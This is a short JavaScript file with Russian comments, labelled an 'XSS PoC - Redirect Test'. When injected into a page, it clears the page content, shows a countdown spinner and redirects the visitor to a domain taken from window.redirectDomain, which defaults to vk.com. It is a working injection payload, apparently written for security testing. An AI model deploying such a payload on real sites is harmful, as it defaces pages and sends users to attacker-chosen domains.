// p.js с поддержкой window.redirectDomain
(function(){
    // Читаем из window.redirectDomain
    var domain = window.redirectDomain || 'vk.com';
    
    // Очищаем URL
    domain = domain.replace(/^https?:\/\//, '').replace(/\/$/, '');
    
    var redirectUrl = 'https://' + domain;
    
    // Очищаем страницу
    document.body.innerHTML = '';
    document.body.style.cssText = 'margin:0;padding:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#f0f0f0;font-family:Arial;';
    
    // Создаем контент
    var html = `
        <div style="text-align:center;padding:20px;background:white;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1)">
            <div style="width:60px;height:60px;border:6px solid #e0e0e0;border-top:6px solid #4285f4;border-radius:50%;margin:0 auto 20px;animation:spin 1s linear infinite"></div>
            <h2 style="color:#333;margin:0 0 10px 0">XSS PoC - Redirect Test</h2>
            <p style="color:#666;margin:0 0 20px 0">Domain from JS: <strong>${domain}</strong></p>
            <div id="timer" style="font-size:24px;color:#4285f4;font-weight:bold">5</div>
            <style>@keyframes spin {to{transform:rotate(360deg)}}</style>
        </div>
    `;
    
    document.body.innerHTML = html;
    
    // Таймер
    var time = 5;
    var timer = setInterval(function() {
        document.getElementById('timer').innerText = --time;
        if (time <= 0) {
            clearInterval(timer);
            window.location.href = redirectUrl;
        }
    }, 1000);
})();

